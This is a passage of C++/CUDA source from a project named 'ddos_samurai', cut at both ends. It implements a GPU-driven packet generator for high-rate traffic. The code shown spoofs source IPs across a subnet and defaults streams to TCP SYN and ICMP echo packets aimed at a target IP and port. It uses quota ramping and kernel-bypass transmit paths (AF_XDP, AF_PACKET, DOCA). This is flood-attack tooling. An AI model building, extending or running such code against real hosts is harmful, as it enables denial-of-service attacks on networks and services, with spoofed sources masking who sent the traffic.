  cudaStreamDestroy(stream);
  return out;
}

void copy_device_buffer_to_host(
    void* dst,
    size_t dst_size,
    const DeviceBuffer& gpu_arr,
    cudaStream_t stream);

void enqueue_device_buffer_to_host_copy(
    void* dst,
    size_t dst_size,
    const DeviceBuffer& gpu_arr,
    cudaStream_t stream) {
  if (!dst || dst_size == 0 || !gpu_arr.valid()) {
    return;
  }
  if (dst_size < gpu_arr.size) {
    throw std::invalid_argument("destination buffer is smaller than device buffer");
  }
  if (stream) {
    throw_if_cuda(
        cudaMemcpyAsync(dst, gpu_arr.ptr, gpu_arr.size, cudaMemcpyDeviceToHost, stream),
        "cudaMemcpyAsync enqueue_device_buffer_to_host_copy failed");
  } else {
    throw_if_cuda(
        cudaMemcpy(dst, gpu_arr.ptr, gpu_arr.size, cudaMemcpyDeviceToHost),
        "cudaMemcpy enqueue_device_buffer_to_host_copy failed");
  }
  g_d2h_transfer_count.fetch_add(1);
  g_d2h_transfer_bytes.fetch_add(gpu_arr.size);
}

void copy_device_buffer_to_host(
    void* dst,
    size_t dst_size,
    const DeviceBuffer& gpu_arr,
    cudaStream_t stream) {
  enqueue_device_buffer_to_host_copy(dst, dst_size, gpu_arr, stream);
  if (stream) {
    throw_if_cuda(cudaStreamSynchronize(stream), "copy_device_buffer_to_host synchronize failed");
  }
}

GPUPacketGenerator::GPUPacketGenerator(
    int max_batch_size,
    std::string real_src_ip,
    bool spoof_ip,
    bool has_ethernet,
    std::string spoof_subnet)
    : max_batch_size_(std::max(1, max_batch_size)),
      real_src_ip_(std::move(real_src_ip)),
      spoof_ip_(spoof_ip),
      has_ethernet_(has_ethernet),
      spoof_subnet_(std::move(spoof_subnet)) {}

std::vector<std::vector<uint8_t>> GPUPacketGenerator::generate_batch(
    const std::vector<uint8_t>& template_bytes,
    int batch_size,
    cudaStream_t stream,
    uint64_t gateway_mac) {
  int count = std::max(0, batch_size);
  if (count > max_batch_size_) {
    throw std::invalid_argument("batch_size exceeds max_batch_size");
  }

  PacketResult res = generate_packets_from_template(
      template_bytes,
      count,
      real_src_ip_,
      spoof_ip_,
      has_ethernet_,
      stream,
      gateway_mac,
      spoof_subnet_);

  std::vector<uint8_t> host = copy_gpu_to_host_pinned(res.packets_gpu, "generator_batch", stream, true);
  std::vector<std::vector<uint8_t>> out;
  out.reserve(count);
  for (int i = 0; i < count; ++i) {
    int start = i * res.packet_size;
    int end = start + res.packet_size;
    out.emplace_back(host.begin() + start, host.begin() + end);
  }
  return out;
}

}  // namespace ddos_samurai::gpu_packet_cuda

namespace {
thread_local std::string g_samurai_gpu_packet_last_error;

constexpr uint64_t kExportHostBufferMagic = 0x53414d5552414931ull;  // SAMURAI1

enum class ExportHostAllocKind : uint32_t {
  kMalloc = 1u,
  kCudaHost = 2u,
};

struct ExportHostBufferHeader {
  uint64_t magic = kExportHostBufferMagic;
  uint32_t alloc_kind = static_cast<uint32_t>(ExportHostAllocKind::kMalloc);
  uint32_t reserved = 0u;
  size_t size = 0u;
  uint64_t pending_stream_handle = 0u;
  uint64_t pending_device_ptr = 0u;
};

static int set_c_api_error(const std::string& msg) {
  g_samurai_gpu_packet_last_error = msg;
  return -1;
}

static int init_c_api_outputs(uint8_t** out_data, size_t* out_size, int* out_packet_size) {
  if (!out_data || !out_size || !out_packet_size) {
    return set_c_api_error("null output pointer");
  }
  *out_data = nullptr;
  *out_size = 0;
  *out_packet_size = 0;
  return 0;
}

static int export_packet_result(
    ddos_samurai::gpu_packet_cuda::PacketResult& res,
    const char* key,
    cudaStream_t stream,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  (void)key;
  uint8_t* payload = nullptr;
  size_t exported_size = 0;
  ExportHostBufferHeader* header = nullptr;
  try {
    if (res.packets_gpu.valid()) {
      exported_size = res.packets_gpu.size;
      if (res.packets_gpu.alloc_kind == ddos_samurai::gpu_packet_cuda::DeviceBuffer::AllocKind::kMappedHost &&
          res.packets_gpu.host_ptr != nullptr) {
        auto* mapped_header = reinterpret_cast<ExportHostBufferHeader*>(
            res.packets_gpu.host_base_ptr ? res.packets_gpu.host_base_ptr : (res.packets_gpu.host_ptr - sizeof(ExportHostBufferHeader)));
        if (mapped_header && mapped_header->magic == kExportHostBufferMagic) {
          mapped_header->pending_stream_handle = static_cast<uint64_t>(reinterpret_cast<uintptr_t>(stream));
          mapped_header->pending_device_ptr = 0u;
        }
        if (!stream) {
          cudaError_t st = cudaDeviceSynchronize();
          if (st != cudaSuccess) {
            return set_c_api_error(std::string("zero-copy device synchronize failed: ") + cudaGetErrorString(st));
          }
        }
        payload = res.packets_gpu.host_ptr;
        res.packets_gpu.ptr = nullptr;
        res.packets_gpu.host_ptr = nullptr;
        res.packets_gpu.host_base_ptr = nullptr;
        res.packets_gpu.size = 0;
        res.packets_gpu.alloc_kind = ddos_samurai::gpu_packet_cuda::DeviceBuffer::AllocKind::kDevice;
      } else {
        const size_t total = sizeof(ExportHostBufferHeader) + res.packets_gpu.size;
        void* raw = nullptr;
        ExportHostAllocKind alloc_kind = ExportHostAllocKind::kCudaHost;
        cudaError_t alloc_rc = cudaHostAlloc(&raw, total, cudaHostAllocPortable);
        if (alloc_rc != cudaSuccess || !raw) {
          raw = std::malloc(total);
          alloc_kind = ExportHostAllocKind::kMalloc;
          if (!raw) {
            return set_c_api_error("host export allocation failed");
          }
        }

        header = static_cast<ExportHostBufferHeader*>(raw);
        header->magic = kExportHostBufferMagic;
        header->alloc_kind = static_cast<uint32_t>(alloc_kind);
        header->reserved = 0u;
        header->size = res.packets_gpu.size;
        header->pending_stream_handle = 0u;
        header->pending_device_ptr = 0u;
        payload = reinterpret_cast<uint8_t*>(header + 1);

        if (res.packets_gpu.size > 0) {
          if (stream) {
            ddos_samurai::gpu_packet_cuda::enqueue_device_buffer_to_host_copy(
                payload,
                res.packets_gpu.size,
                res.packets_gpu,
                stream);
            header->pending_stream_handle = static_cast<uint64_t>(reinterpret_cast<uintptr_t>(stream));
            header->pending_device_ptr = static_cast<uint64_t>(reinterpret_cast<uintptr_t>(res.packets_gpu.ptr));
            res.packets_gpu.ptr = nullptr;
            res.packets_gpu.host_ptr = nullptr;
            res.packets_gpu.host_base_ptr = nullptr;
            res.packets_gpu.size = 0;
            res.packets_gpu.alloc_kind = ddos_samurai::gpu_packet_cuda::DeviceBuffer::AllocKind::kDevice;
          } else {
            ddos_samurai::gpu_packet_cuda::copy_device_buffer_to_host(
                payload,
                res.packets_gpu.size,
                res.packets_gpu,
                stream);
          }
        }
      }
    }
  } catch (const std::exception& e) {
    if (header) {
      if (static_cast<ExportHostAllocKind>(header->alloc_kind) == ExportHostAllocKind::kCudaHost) {
        cudaFreeHost(static_cast<void*>(header));
      } else {
        std::free(static_cast<void*>(header));
      }
    }
    return set_c_api_error(e.what());
  }
  *out_data = payload;
  *out_size = exported_size;
  *out_packet_size = res.packet_size;
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

static cudaStream_t decode_stream_handle(uint64_t stream_handle) {
  return reinterpret_cast<cudaStream_t>(static_cast<uintptr_t>(stream_handle));
}

enum class KernelMode : int {
  kBatch = 0,
  kPersistent = 1,
};

enum class PersistentStreamKind : int32_t {
  kL4 = 0,
  kIcmp = 1,
  kPcapReplay = 2,
  kRamp = 3,
};

constexpr int kPersistentUmemFrameSize = 2048;
constexpr int kPersistentUmemHeadroom = 256;
constexpr int kPersistentMaxStreams = 256;
constexpr int kPersistentMaxPacketBytes = kPersistentUmemFrameSize - kPersistentUmemHeadroom;
constexpr int kPersistentDefaultMtu = 1500;
constexpr int kPersistentPayloadCapacity = 1460;
constexpr int kXdpNativeApiVersion = 2;

struct XdpNativeStats {
  uint64_t tx_packets;
  uint64_t tx_bytes;
  uint64_t tx_errors;
  uint64_t tx_wakeups;
  int mode;
  int queue_id;
};

struct XdpNativeApiV1 {
  int version;
  int (*create_ctx)(const char* ifname, int queue_id, int mode, char* err, size_t err_len);
  int (*destroy_ctx)(int handle, char* err, size_t err_len);
  int (*send_buffer)(int handle, const uint8_t* buffer, int packet_size, int count, char* err, size_t err_len);
  int (*send_buffer_strided)(
      int handle,
      const uint8_t* buffer,
      int packet_size,
      int stride,
      int count,
      char* err,
      size_t err_len);
  int (*send_vector)(
      int handle,
      const uint8_t** packets,
      const uint16_t* lengths,
      int count,
      char* err,
      size_t err_len);
  int (*get_stats)(int handle, XdpNativeStats* out, char* err, size_t err_len);
  int (*create_ctx_external_umem)(
      const char* ifname,
      int queue_id,
      int mode,
      void* umem_buffer,
      size_t umem_buffer_len,
      int frame_size,
      int headroom,
      int frame_count,
      char* err,
      size_t err_len);
  int (*submit_frame_ids)(
      int handle,
      const uint32_t* frame_ids,
      const uint16_t* lengths,
      int count,
      char* err,
      size_t err_len);
  int (*reap_completions)(
      int handle,
      uint32_t* frame_ids_out,
      int max_count,
      char* err,
      size_t err_len);
};

extern "C" __attribute__((weak)) XdpNativeApiV1* samurai_xdp_get_native_api_v1(void);
extern "C" __attribute__((weak)) int samurai_fast_sender_send_ring_bridge(
    const char* iface,
    const uint8_t* buffer,
    size_t buffer_len,
    int packet_size,
    int count,
    const uint8_t mac[6],
    int* out_sent,
    int* out_errors,
    char* err_msg,
    size_t err_msg_len);
extern "C" __attribute__((weak)) int samurai_fast_sender_cleanup_ring_bridge(void);
extern "C" __attribute__((weak)) uint64_t samurai_pacing_time_ns(void);
extern "C" __attribute__((weak)) void samurai_pacing_precision_wait_ns(uint64_t target_ns);

struct PersistentRingSlot {
  volatile int32_t state = 0;  // 0=free, 1=ready, 2=reserved(write in progress), 3=in-flight
  int32_t len = 0;
  int32_t stream_id = 0;
  int32_t stream_slot = -1;
  int32_t protocol = 0;
  uint64_t tx_timestamp_ns = 0u;
};

struct PersistentRuntimeControl {
  volatile int32_t run = 0;
  int32_t queue_count = 1;
  int32_t ring_slots = 0;
  int32_t max_streams = kPersistentMaxStreams;
  int32_t active_streams = 0;
  int32_t queue_probe_span = 4;
  int32_t max_packet_bytes = kPersistentMaxPacketBytes;
  uint64_t heartbeat = 0;
  uint64_t produced = 0;
  uint64_t queue_pressure = 0;
  uint64_t queue_spread_events = 0;
  uint64_t quota_stall = 0;
  uint64_t idle_gap = 0;
  uint64_t no_progress_events = 0;
  uint64_t runtime_restarts = 0;
  uint64_t tx_bridge_sent = 0;
  uint64_t ring_occupancy_peak = 0;
  uint64_t ring_released = 0;
  uint64_t bridge_drain_batches = 0;
  uint64_t bridge_drain_packets = 0;
  uint64_t ring_drop_events = 0;
  uint64_t scheduler_fairness_cv_pct_x100 = 0;
  uint64_t throttle_events = 0;
  uint64_t drain_attempts = 0;
  uint64_t native_batch_degrade_events = 0;
  uint64_t contract_poll_events = 0;
  uint64_t contract_poll_epoch_mismatch = 0;
  uint64_t contract_poll_inactive_flow = 0;
  uint64_t contract_poll_stale_events = 0;
};

struct PersistentKernelStaticConfig {
  int32_t queue_count = 1;
  int32_t ring_slots = 0;
  int32_t max_streams = kPersistentMaxStreams;
  int32_t queue_probe_span = 4;
  int32_t max_packet_bytes = kPersistentMaxPacketBytes;
};

__device__ __constant__ PersistentKernelStaticConfig g_persistent_kernel_static_cfg;

struct PersistentDeviceStreamState {
  int32_t active = 0;
  int32_t stream_id = 0;
  int32_t stream_kind = static_cast<int32_t>(PersistentStreamKind::kL4);
  int32_t protocol = 6;
  int32_t has_ethernet = 1;
  int32_t spoof_enabled = 0;
  int32_t queue_affinity = -1;
  uint32_t target_ip = 0;
  uint32_t src_ip = 0;
  uint32_t spoof_base_ip = 0;
  uint32_t spoof_mask = 32;
  uint16_t target_port = 0;
  uint16_t tcp_flags = 0x02;
  uint16_t tcp_window = 65535;
  uint16_t source_port = 0;
  int32_t icmp_type = 8;
  int32_t icmp_code = 0;
  uint32_t quota = 0;
  uint32_t quota_left = 0;
  uint32_t ramp_step = 0;
  uint32_t ramp_interval_epochs = 0;
  uint32_t ramp_max_quota = 0;
  uint32_t ramp_epoch_counter = 0;
  uint32_t seq_counter = 0;
  uint32_t produced = 0;
  uint32_t completed = 0;
  uint32_t queue_cursor = 0;
  uint32_t weight = 1;
  uint32_t deficit = 0;
  uint16_t payload_len = 0;
  uint8_t payload_byte = 0;
  uint8_t source_port_mode = 0;  // 0=auto, 1=fixed
  uint8_t has_custom_mac = 0;
  uint8_t src_mac[6]{0, 0, 0, 0, 0, 0};
  uint8_t dst_mac[6]{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint64_t tx_base_timestamp_ns = 0u;
  uint32_t tx_ipg_ns = 0u;
  uint32_t _tx_pad = 0u;
  uint8_t payload[kPersistentPayloadCapacity]{};
  uint16_t template_len = 0;
  uint16_t template_ip_off = 0;
  uint16_t template_l4_off = 0;
  uint16_t template_l4_len = 0;
  uint16_t template_base_ip_csum = 0;
  uint16_t template_base_l4_csum = 0;
  uint16_t template_base_ip_id = 0;
  uint16_t template_base_ttl_proto = 0;
  uint16_t template_base_src_port = 0;
  uint32_t template_base_src_ip = 0;
  uint32_t template_base_dst_ip = 0;
  uint32_t template_base_tcp_seq = 0;
  uint32_t template_base_tcp_ack = 0;
  uint8_t template_valid = 0;
  uint8_t template_packet[kPersistentMaxPacketBytes]{};
};

struct PersistentStreamHotState {
  int32_t active = 0;
  int32_t stream_id = 0;
  int32_t protocol = 0;
  int32_t queue_affinity = -1;
  uint32_t target_ip = 0;
  uint16_t target_port = 0;
  uint16_t _pad = 0;
};

struct PersistentStreamState {
  int64_t id = 0;
  std::string profile_json;
  std::string update_json;
  std::string stream_type = "l4";
  int device_slot = -1;
  int stream_kind = static_cast<int>(PersistentStreamKind::kL4);
  int protocol = 6;
  int queue_affinity = -1;
  uint32_t target_ip_int = 0;
  uint32_t src_ip_int = 0;
  uint32_t spoof_base_ip = 0;
  uint32_t spoof_mask = 32;
  uint16_t target_port = 0;
  uint16_t tcp_flags = 0x02;
  uint16_t tcp_window = 65535;
  uint16_t source_port = 0;
  int icmp_type = 8;
  int icmp_code = 0;
  uint32_t base_quota = 0;
  uint32_t quota = 0;
  uint32_t quota_left = 0;
  uint32_t ramp_step = 0;
  uint32_t ramp_interval_epochs = 0;
  uint32_t ramp_max_quota = 0;
  uint32_t ramp_epoch_counter = 0;
  std::string pcap_file;
  uint64_t created_ns = 0;
  uint64_t updated_ns = 0;
  uint64_t heartbeat_ns = 0;
  uint64_t progress_ns = 0;
  uint64_t submitted = 0;
  uint64_t completed = 0;
  uint64_t fallback = 0;
  uint64_t errors = 0;
  uint64_t queue_pressure = 0;
  uint64_t quota_stall = 0;
  uint64_t bridge_sent = 0;
  uint64_t occupancy_peak = 0;
  uint64_t bridge_drain_batches = 0;
  uint64_t bridge_drain_packets = 0;
  uint64_t ring_drop_events = 0;
  double scheduler_fairness_cv_pct = 0.0;
  uint16_t payload_len = 0;
  uint8_t payload_byte = 0;
  uint8_t source_port_mode = 0;
  uint8_t has_custom_mac = 0;
  std::array<uint8_t, 6> src_mac{{0, 0, 0, 0, 0, 0}};
  std::array<uint8_t, 6> dst_mac{{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}};
  uint64_t tx_base_timestamp_ns = 0u;
  uint32_t tx_ipg_ns = 0u;
  int active = 1;
};

enum class PersistentTxBackendKind : int {
  kNoop = 0,
  kAfXdp = 1,
  kAfPacket = 2,
  kDocaGpuNetIO = 3,
};

constexpr int kPersistentDocaGpuNetioApiVersion = 3;

struct PersistentDocaGpuNetioStats {
  uint64_t tx_packets = 0u;
  uint64_t tx_bytes = 0u;
  uint64_t tx_errors = 0u;
  uint64_t tx_drops = 0u;
  int queue_id = 0;
};

struct PersistentDocaFlowUpdateEventV1 {
  uint64_t version = 0u;
  uint64_t epoch = 0u;
  uint32_t flow_id = 0u;
  uint32_t tcp_seq = 0u;
  uint32_t tcp_ack = 0u;
  uint16_t src_port = 0u;
  uint16_t dst_port = 0u;
  uint8_t tcp_state = 0u;
  uint8_t proto = 0u;
  uint16_t flags = 0u;
  uint32_t rtt_us = 0u;
  uint64_t dpu_ts_ns = 0u;
};

struct PersistentDocaContractWriterConfigV1 {
  char region_spec[512]{};
  char device_name[64]{};
  uint32_t shard_count = 0u;
  uint32_t ring_slots_per_shard = 0u;
  uint32_t hot_flow_capacity = 0u;
  uint32_t flags = 0u;
};

struct PersistentDocaGpuNetioApiV1 {
  int version = 0;
  int (*create_txq)(
      const char* iface,
      const char* device_name,
      int gpu_id,
      int queue_id,
      int* out_handle,
      char* err,
      size_t err_len) = nullptr;
  int (*destroy_txq)(int handle, char* err, size_t err_len) = nullptr;
  int (*send_vector)(
      int handle,
      const uint8_t** packets,
      const uint16_t* lengths,
      const int32_t* stream_slots,
      int count,
      int* out_sent,
      int* out_errors,
      char* err,
      size_t err_len) = nullptr;
  int (*send_vector_timed)(
      int handle,
      const uint8_t** packets,
      const uint16_t* lengths,
      const int32_t* stream_slots,
      const uint64_t* tx_timestamps_ns,
      int count,
      int* out_sent,
      int* out_errors,
      char* err,
      size_t err_len) = nullptr;
  int (*get_stats)(int handle, PersistentDocaGpuNetioStats* out, char* err, size_t err_len) = nullptr;
  int (*get_gpu_txq_handle)(int handle, uint64_t* out_gpu_txq_handle, char* err, size_t err_len) = nullptr;
  int (*get_txq_mkey_be)(int handle, uint32_t* out_mkey_be, char* err, size_t err_len) = nullptr;
  int (*contract_writer_open)(
      const PersistentDocaContractWriterConfigV1* cfg,
      int* out_handle,
      char* err,
      size_t err_len) = nullptr;
  int (*contract_writer_close)(int handle, char* err, size_t err_len) = nullptr;
  int (*contract_writer_publish_flow_update_v1)(
      int handle,
      const PersistentDocaFlowUpdateEventV1* event,
      char* err,
      size_t err_len) = nullptr;
};

struct PersistentTxBridgeRuntime {
  PersistentTxBackendKind kind = PersistentTxBackendKind::kNoop;
  std::string requested = "auto";
  std::string active = "noop";
  std::string iface{};
  int xdp_mode = 0;
  int xdp_queue_base = 0;
  std::array<uint8_t, 6> afpacket_mac{{0xFFu, 0xFFu, 0xFFu, 0xFFu, 0xFFu, 0xFFu}};
  const XdpNativeApiV1* xdp_api = nullptr;
  const PersistentDocaGpuNetioApiV1* doca_api = nullptr;
  std::string doca_device{};
  int doca_gpu_id = 0;
  int (*afpacket_send_bridge)(
      const char* iface,
      const uint8_t* buffer,
      size_t buffer_len,
      int packet_size,
      int count,
      const uint8_t mac[6],
      int* out_sent,
      int* out_errors,
      char* err_msg,
      size_t err_msg_len) = nullptr;
  int (*afpacket_cleanup_bridge)(void) = nullptr;
  std::vector<int> xdp_handles{};
  std::vector<int> doca_txq_handles{};
  std::vector<uint64_t> doca_gpu_txq_handles{};
  std::vector<uint32_t> doca_txq_mkeys_be{};
  bool doca_kernel_direct_tx = false;
  bool doca_timed_tx_enabled = false;
  bool doca_timed_tx_required = false;
};

std::mutex g_persistent_lock;
std::unordered_map<int64_t, PersistentStreamState> g_persistent_streams;
std::atomic<int64_t> g_next_stream_id{1};
std::atomic<int> g_kernel_mode{static_cast<int>(KernelMode::kBatch)};
std::atomic<uint64_t> g_compat_fallback_count{0};
struct PersistentRuntime {
  cudaStream_t kernel_stream = nullptr;
  cudaStream_t bridge_copy_stream = nullptr;
  cudaEvent_t bridge_copy_event = nullptr;
  cudaStream_t quota_refill_stream = nullptr;
  cudaGraph_t quota_refill_graph = nullptr;
  cudaGraphExec_t quota_refill_graph_exec = nullptr;
  bool quota_refill_graph_enabled = false;
  PersistentRuntimeControl* ctrl = nullptr;                       // mapped host
  PersistentRuntimeControl* ctrl_dev = nullptr;                   // mapped device
  int32_t* run_flag_dev = nullptr;                                // device-only hot run gate
  PersistentDeviceStreamState* streams = nullptr;                 // mapped host
  PersistentDeviceStreamState* streams_dev = nullptr;             // device-resident authoritative state
  PersistentStreamHotState* streams_hot_dev = nullptr;            // device-only hot stream mirror
  PersistentRingSlot* rings_host = nullptr;                       // mapped host mirror
  PersistentRingSlot* rings_dev = nullptr;                        // device ring state
  int32_t* queue_slot_hint_dev = nullptr;                         // device queue-local slot hint
  uint8_t* payload_host = nullptr;                                // mapped host UMEM payload
  uint8_t* payload_dev = nullptr;                                 // device payload buffer
  uint64_t* doca_gpu_txq_handles_dev = nullptr;                   // device txq handles for kernel direct DOCA TX
  uint32_t* doca_txq_mkeys_be_dev = nullptr;                      // device txq mkeys (big-endian) for direct DOCA TX
  std::vector<std::thread> bridge_threads;
  std::thread monitor_thread;
  std::atomic<bool> threads_running{false};
  std::atomic<uint64_t> last_produced_seen{0};
  std::atomic<uint64_t> last_progress_ns{0};
  int queue_count = 1;
  int ring_slots = 0;
  int epoch_ms = 50;
  int heartbeat_ms = 500;
  int no_progress_ms = 2000;
  int bridge_max_burst = 64;
  int bridge_thread_count = 1;
  int bridge_idle_sleep_us = 200;
  int bridge_drain_budget_ns = 200000;
  int bridge_ipg_ns = 0;
  bool bridge_copy_overlap_reap = true;
  int max_packet_bytes = kPersistentMaxPacketBytes;
  uint64_t bridge_next_send_ns = 0;
  std::atomic<uint64_t> last_epoch_refill_ns{0};
  std::vector<uint32_t> queue_drain_cursor{};
  std::vector<uint64_t> queue_sent_counts{};
  bool doca_kernel_direct_tx = false;
  std::array<std::atomic<uint64_t>, kPersistentMaxStreams> completed_by_slot{};
  PersistentTxBridgeRuntime tx_bridge{};

  ~PersistentRuntime() noexcept {
    // Process-exit safety: avoid std::terminate from joinable std::thread.
    threads_running.store(false, std::memory_order_relaxed);
    if (ctrl) {
      ctrl->run = 0;
    }
    if (run_flag_dev) {
      const int32_t run_off = 0;
      (void)cudaMemcpy(run_flag_dev, &run_off, sizeof(run_off), cudaMemcpyHostToDevice);
    }
    if (kernel_stream) {
      (void)cudaStreamSynchronize(kernel_stream);
    } else {
      (void)cudaDeviceSynchronize();
    }
    if (bridge_copy_stream) {
      (void)cudaStreamSynchronize(bridge_copy_stream);
    }
    if (bridge_copy_event) {
      (void)cudaEventDestroy(bridge_copy_event);
      bridge_copy_event = nullptr;
    }
    if (quota_refill_graph_exec) {
      (void)cudaGraphExecDestroy(quota_refill_graph_exec);
      quota_refill_graph_exec = nullptr;
    }
    if (quota_refill_graph) {
      (void)cudaGraphDestroy(quota_refill_graph);
      quota_refill_graph = nullptr;
    }
    for (auto& t : bridge_threads) {
      if (t.joinable()) {
        t.join();
      }
    }
    bridge_threads.clear();
    if (monitor_thread.joinable()) {
      monitor_thread.join();
    }
    if (kernel_stream) {
      (void)cudaStreamDestroy(kernel_stream);
      kernel_stream = nullptr;
    }
    if (bridge_copy_stream) {
      (void)cudaStreamDestroy(bridge_copy_stream);
      bridge_copy_stream = nullptr;
    }
    if (quota_refill_stream) {
      (void)cudaStreamDestroy(quota_refill_stream);
      quota_refill_stream = nullptr;
    }
    if (rings_host) {
      (void)cudaFreeHost(rings_host);
      rings_host = nullptr;
    }
    if (rings_dev) {
      (void)cudaFree(rings_dev);
      rings_dev = nullptr;
    }
    if (payload_host) {
      (void)cudaFreeHost(payload_host);
      payload_host = nullptr;
    }
    if (payload_dev) {
      (void)cudaFree(payload_dev);
      payload_dev = nullptr;
    }
    if (doca_gpu_txq_handles_dev) {
      (void)cudaFree(doca_gpu_txq_handles_dev);
      doca_gpu_txq_handles_dev = nullptr;
    }
    if (doca_txq_mkeys_be_dev) {
      (void)cudaFree(doca_txq_mkeys_be_dev);
      doca_txq_mkeys_be_dev = nullptr;
    }
  if (streams) {
    (void)cudaFreeHost(streams);
    streams = nullptr;
  }
  if (streams_dev) {
    (void)cudaFree(streams_dev);
    streams_dev = nullptr;
  }
    if (ctrl) {
      (void)cudaFreeHost(ctrl);
      ctrl = nullptr;
      ctrl_dev = nullptr;
    }
    if (streams_hot_dev) {
      (void)cudaFree(streams_hot_dev);
      streams_hot_dev = nullptr;
    }
    if (run_flag_dev) {
      (void)cudaFree(run_flag_dev);
      run_flag_dev = nullptr;
    }
  }
};
PersistentRuntime g_persistent_runtime;
struct PersistentContractRuntime {
  int shard_count = 0;
  int ring_slots_per_shard = 0;
  int hot_flow_capacity = 0;
  ddos_samurai::gpu_packet_cuda::zero_copy::RingOverflowPolicy overflow_policy =
      ddos_samurai::gpu_packet_cuda::zero_copy::RingOverflowPolicy::kControlledDrop;
  std::vector<ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1> update_ring{};
  std::vector<uint64_t> ring_head{};
  std::vector<uint64_t> ring_tail{};
  std::vector<uint64_t> ring_drop_by_shard{};
  std::vector<ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1> hot_flow_table{};
  std::vector<uint64_t> hot_flow_versions{};
  std::vector<uint64_t> hot_flow_epochs{};
  ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1* update_ring_dev = nullptr;
  uint64_t* ring_head_dev = nullptr;
  uint64_t* ring_tail_dev = nullptr;
  ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1* hot_flow_table_dev = nullptr;
  uint64_t* hot_flow_versions_dev = nullptr;
  uint64_t* hot_flow_epochs_dev = nullptr;
  uint64_t publish_count = 0u;
  uint64_t drop_count = 0u;
  uint64_t version_gap_count = 0u;
  uint64_t epoch_mismatch_count = 0u;
  uint64_t device_sync_error_count = 0u;
  bool device_mirror_initialized = false;
  bool initialized = false;
};
PersistentContractRuntime g_persistent_contract_runtime;
thread_local std::string g_stream_stats_json;

inline uint64_t now_ns_steady() {
  return static_cast<uint64_t>(
      std::chrono::duration_cast<std::chrono::nanoseconds>(
          std::chrono::steady_clock::now().time_since_epoch())
          .count());
}

inline void persistent_contract_runtime_release_unlocked() {
  auto& cr = g_persistent_contract_runtime;
  if (cr.update_ring_dev) {
    (void)cudaFree(cr.update_ring_dev);
    cr.update_ring_dev = nullptr;
  }
  if (cr.ring_head_dev) {
    (void)cudaFree(cr.ring_head_dev);
    cr.ring_head_dev = nullptr;
  }
  if (cr.ring_tail_dev) {
    (void)cudaFree(cr.ring_tail_dev);
    cr.ring_tail_dev = nullptr;
  }
  if (cr.hot_flow_table_dev) {
    (void)cudaFree(cr.hot_flow_table_dev);
    cr.hot_flow_table_dev = nullptr;
  }
  if (cr.hot_flow_versions_dev) {
    (void)cudaFree(cr.hot_flow_versions_dev);
    cr.hot_flow_versions_dev = nullptr;
  }
  if (cr.hot_flow_epochs_dev) {
    (void)cudaFree(cr.hot_flow_epochs_dev);
    cr.hot_flow_epochs_dev = nullptr;
  }
  cr.shard_count = 0;
  cr.ring_slots_per_shard = 0;
  cr.hot_flow_capacity = 0;
  cr.overflow_policy = ddos_samurai::gpu_packet_cuda::zero_copy::RingOverflowPolicy::kControlledDrop;
  cr.update_ring.clear();
  cr.ring_head.clear();
  cr.ring_tail.clear();
  cr.ring_drop_by_shard.clear();
  cr.hot_flow_table.clear();
  cr.hot_flow_versions.clear();
  cr.hot_flow_epochs.clear();
  cr.publish_count = 0u;
  cr.drop_count = 0u;
  cr.version_gap_count = 0u;
  cr.epoch_mismatch_count = 0u;
  cr.device_sync_error_count = 0u;
  cr.device_mirror_initialized = false;
  cr.initialized = false;
}

inline bool persistent_contract_runtime_alloc_device_mirror_unlocked(
    PersistentContractRuntime& cr,
    size_t ring_total,
    size_t shard_count_s,
    size_t hot_flow_capacity_s) {
  const size_t event_bytes = sizeof(ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1);
  const size_t ring_bytes = ring_total * event_bytes;
  const size_t shard_bytes = shard_count_s * sizeof(uint64_t);
  const size_t hot_flow_bytes = hot_flow_capacity_s * event_bytes;
  const size_t hot_meta_bytes = hot_flow_capacity_s * sizeof(uint64_t);
  if (ring_bytes == 0u || shard_bytes == 0u || hot_flow_bytes == 0u || hot_meta_bytes == 0u) {
    return false;
  }
  if (cudaMalloc(&cr.update_ring_dev, ring_bytes) != cudaSuccess || !cr.update_ring_dev) {
    return false;
  }
  if (cudaMalloc(&cr.ring_head_dev, shard_bytes) != cudaSuccess || !cr.ring_head_dev) {
    return false;
  }
  if (cudaMalloc(&cr.ring_tail_dev, shard_bytes) != cudaSuccess || !cr.ring_tail_dev) {
    return false;
  }
  if (cudaMalloc(&cr.hot_flow_table_dev, hot_flow_bytes) != cudaSuccess || !cr.hot_flow_table_dev) {
    return false;
  }
  if (cudaMalloc(&cr.hot_flow_versions_dev, hot_meta_bytes) != cudaSuccess || !cr.hot_flow_versions_dev) {
    return false;
  }
  if (cudaMalloc(&cr.hot_flow_epochs_dev, hot_meta_bytes) != cudaSuccess || !cr.hot_flow_epochs_dev) {
    return false;
  }
  if (cudaMemset(cr.update_ring_dev, 0, ring_bytes) != cudaSuccess ||
      cudaMemset(cr.ring_head_dev, 0, shard_bytes) != cudaSuccess ||
      cudaMemset(cr.ring_tail_dev, 0, shard_bytes) != cudaSuccess ||
      cudaMemset(cr.hot_flow_table_dev, 0, hot_flow_bytes) != cudaSuccess ||
      cudaMemset(cr.hot_flow_versions_dev, 0, hot_meta_bytes) != cudaSuccess ||
      cudaMemset(cr.hot_flow_epochs_dev, 0, hot_meta_bytes) != cudaSuccess) {
    return false;
  }
  cr.device_mirror_initialized = true;
  return true;
}

inline bool persistent_contract_runtime_sync_device_slot_unlocked(
    PersistentContractRuntime& cr,
    size_t ring_index,
    size_t shard,
    size_t flow_id) {
  if (!cr.device_mirror_initialized || !cr.update_ring_dev || !cr.ring_head_dev || !cr.ring_tail_dev ||
      !cr.hot_flow_table_dev || !cr.hot_flow_versions_dev || !cr.hot_flow_epochs_dev) {
    cr.device_sync_error_count += 1u;
    return false;
  }
  if (ring_index >= cr.update_ring.size() || shard >= cr.ring_head.size() || shard >= cr.ring_tail.size() ||
      flow_id >= cr.hot_flow_table.size() || flow_id >= cr.hot_flow_versions.size() || flow_id >= cr.hot_flow_epochs.size()) {
    cr.device_sync_error_count += 1u;
    return false;
  }
  if (cudaMemcpy(
